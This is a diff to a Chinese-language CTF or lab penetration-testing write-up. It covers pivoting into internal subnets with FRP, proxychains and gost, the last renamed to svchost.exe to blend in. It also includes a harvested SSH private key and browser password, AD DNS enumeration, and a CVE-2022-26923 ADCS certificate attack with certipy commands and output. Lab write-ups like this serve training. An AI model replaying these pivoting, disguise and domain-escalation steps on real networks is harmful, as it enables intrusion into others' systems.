@@ -329,29 +329,56 @@ dynamic_chain
 socks5  101.132.149.233  6000
 ```
 
+3. kali本地新建 proxychains4-24.conf
+```
+cp /etc/proxychains4.conf /etc/proxychains4-24.conf
+```
+4. 然后对`proxychains4-24.conf`做如下配置：
+```
+strict_chain
+proxy_dns
+remote_dns_subnet 224
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+[ProxyList]
+socks5 101.132.149.233 6001
+```
+ 5. 访问`172.24.7.0/24`
+ ```
+必须使用 PROXYCHAINS_CONF_FILE 环境变量指定 proxychains4-24.conf（对应 6001 端口，通往 172.24.7.0/24）。
+ ```
 ### 三、FRP 两端配置核对（防止端口 / 类型错误）
-#### 1. 阿里云 frps.ini（服务端）
+#### 1. 阿里云 frps.toml（服务端）
 
 确保配置允许转发，示例参考：
 ```ini
-[common]
-bind_port = 7000
+bindPort = 7000
 # 如需Socks5穿透，无需额外插件配置，客户端映射即可
 ```
-#### 2. 内网机器 frpc.ini（现有的客户端配置）
+#### 2. 内网机器 frpc.toml（现有的客户端配置）
 当前配置：
-```ini
-[common]
-server_addr = 101.132.149.233
-server_port = 7000
+```
+serverAddr = "101.132.149.233"
+serverPort = 7000
 
-[plugin_socks5]
-type = tcp
-remote_port = 6000
+[[proxies]]
+name = "plugin_socks5"
+type = "tcp"
+remotePort = 6000
+plugin = { type = "socks5" }
+
+# 新增：将 172.23.4.12 的 socks5 映射到阿里云 6001 端口
+[[proxies]]
+name = "socks5-via-172.23.4.12"
+type = "tcp"
+localIP = "172.23.4.12"
+localPort = 1080
+remotePort = 6001
 ```
 ✅ 配置无误：将**内网机器的 Socks5 代理**暴露到阿里云 `6000` 端口。
 
-> 补充：`plugin_socks5` 就是 FRP 内置 Socks5 插件，代理出口为**内网机器**，正好用来访问同网段 `172.23.4.0/24`。
+✅  新增的`proxies`为后面`172.23.7.0`段代理转发用
 
 ### 四、分层测试（从易到难，定位问题）
 
@@ -460,7 +487,8 @@ IOXIDRES... 172.23.4.12     445    IZMN9U6ZO3VTRNZ  Address: 172.24.7.16
 简单说：**这条命令是在代理下，无密码探测目标是否存在 CVE-2024-35240 漏洞，并尝试读取内存信息。**
 ---
 
-### 在域用户 usera 的 ~/.ssh/ 目录，发现 ssh 私钥 id_rsa：
+### 私钥id_rsa
+在域用户 usera 的 ~/.ssh/ 目录，发现 ssh 私钥 id_rsa：
 ```bash
 PS C:\Users\usera> ls ~/.ssh/
 
@@ -517,7 +545,7 @@ b0sfmPLebR4HrTAAAAHXBlbnRlc3RcdXNlcmFAaVptbjl1NnpvM3Z0cm5aAQIDBAU=
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-### known_hosts 文件中查看到两个 IP：
+known_hosts 文件中查看到两个 IP：
 ```
 PS C:\Users\usera\.ssh> type .\known_hosts
 172.23.4.19 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFJJrccRyWXl3ukzzZQooQ1A/F1BhaBSJaZ7EaYbNKay7NB0NE7icsSZM63KcXKj5W5Fenhiz+JF7f4qyvzJpw4=
@@ -553,15 +581,11 @@ Last login: Sun Aug  7 20:15:50 2022 from 172.19.0.251
 root@iZ8vb696kwdecbjpccfyboZ:~# cat /flag
 flag{id_rsa_so_useful!}
 ```
-
-
-```
-flag{id_rsa_so_useful!}
-```
-
-
 # flag05
 
+## 登录172.24.7.12
+
+### 扫描172.24.7.16/24 
 这里在kali用代理运行`proxychains4 -q nxc smb 172.24.7.16/24`一直检测不到，
 换种方式直接在172.23.4.12上运行`.\fscan.exe -h 172.24.7.16/24 `
 `172.24.7.16`访问不到原因 https://www.doubao.com/thread/w0a279de411cdee37
@@ -643,6 +667,7 @@ flag{id_rsa_so_useful!}
 172.24.7.48 IZAYSXE6VCUHB4Z
 ```
 
+### edge浏览器
 刚才的172.23.4.12中edge浏览器发现密码
 ```
 admin
@@ -650,13 +675,21 @@ confluence_ichunqiu_2022
 ```
 ![](assets/file-20260601222259431.png)
 
-### 发现名单
+#### 发现名单
 ![](assets/file-20260601222726038.png)
 
 
 ## VLAN 2 - 172.24.7.0/24
 
-SMB 扫描该网段的 Windows 主机：
+前面提到在kali用代理运行`proxychains4 -q nxc smb 172.24.7.16/24`一直检测不到，
+下面开始在`172.23.4.12`上==**打洞**==,将 `gost.exe` 重命名为 `update.exe` 或 `svchost.exe`，在 `172.23.4.12 `的 shell 中执行：
+```
+.\update.exe -L socks5://0.0.0.0:1080
+```
+### SMB 扫描该网段的 Windows 主机：
+
+必须使用 `PROXYCHAINS_CONF_FILE` 环境变量指定 `proxychains4-24.conf`（对应 `6001` 端口，通往 `172.24.7.0/24`）。
+
 ```bash
 ☁  endless   PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q nxc smb 172.24.7.16/24 
 SMB         172.24.7.3      445    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:pentest.me) (signing:True) (SMBv1:True)
@@ -676,20 +709,14 @@ IOXIDRES... 172.24.7.3      445    DC               Address: 172.24.7.3
 IOXIDRES... 172.24.7.3      445    DC               Address: 172.25.12.9
 ```
 
-
-必须使用 PROXYCHAINS_CONF_FILE 环境变量指定 proxychains4-24.conf（对应 6001 端口，通往 172.24.7.0/24）。
-
-
-## 查询 pentest.me 域中所有 DNS 记录，分析域内网络环境：
-
+查询 pentest.me 域中所有 DNS 记录，分析域内网络环境：
 用下面的会报错
 ```
 proxychains4 -q nxc ldap 172.24.7.3 -u usera -p Admin3gv83 -d pentest.me -ns 172.24.7.3 -M get-network -o ALL=true
 ```
-
-###  用 ldapsearch（原生、最稳、无依赖）
-
-#### 直接查 AD 集成 DNS（普通域用户权限即可）：
+ 
+用 ldapsearch（原生、最稳、无依赖）
+- 直接查 AD 集成 DNS（普通域用户权限即可）：
 ```bash
 # 先查有哪些 DNS 区域
 PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q \
@@ -698,7 +725,7 @@ ldapsearch -x -H ldap://172.24.7.3 \
   -b "CN=MicrosoftDNS,DC=DomainDnsZones,DC=pentest,DC=me" "(objectClass=dnsZone)"
 ```
 
-#### 再查具体记录：
+- 再查具体记录：
 ```bash
 PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q \
 ldapsearch -x -H ldap://172.24.7.3 \
@@ -706,6 +733,8 @@ ldapsearch -x -H ldap://172.24.7.3 \
   -b "DC=pentest.me,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pentest,DC=me" "(objectClass=dnsNode)" \
   name dnsRecord
 ```
+
+==//TODO 存在 ADCS==
 
 查看域 MAQ 属性，使用域用户 `usera@pentest.me` 打 `CVE-2022-26923` 漏洞：
 ```
@@ -716,7 +745,7 @@ MAQ         172.24.7.3      389    DC               [*] Getting the MachineAccou
 MAQ         172.24.7.3      389    DC               MachineAccountQuota: 10
 ```
 
-使用 certipy 创建一个机器账户，并将该机器账户 dNSHostName 属性指向域控：
+使用 `certipy-ad` 创建一个机器账户，并将该机器账户 `DNSHostName` 属性指向域控：
 ```bash
 ☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q certipy-ad account create -u usera@pentest.me -p 'Admin3gv83' -dc-ip 172.24.7.3 -user 'EVILCOMPUTER1$' -pass '123@#ABC' -dns 'DC.pentest.me'
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -731,7 +760,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Successfully created account 'EVILCOMPUTER1$' with password '123@#ABC'
 ```
 
-使用该机器账户向 AD CS 服务器请求域控的证书：
+使用该机器账户向 ADCS 服务器请求域控的证书：
 ```bash
 ☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -f -q certipy-ad req \
   -u 'EVILCOMPUTER1$@pentest.me' \
@@ -771,8 +800,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [+] Data written to 'dc.pfx'
 [*] Wrote certificate and private key to 'dc.pfx'
 ```
-
-#### 关键参数解释（Certipy 5.0.4 版本）
+关键参数解释（Certipy 5.0.4 版本）
 
 |参数|作用|为什么必须加|
 |---|---|---|
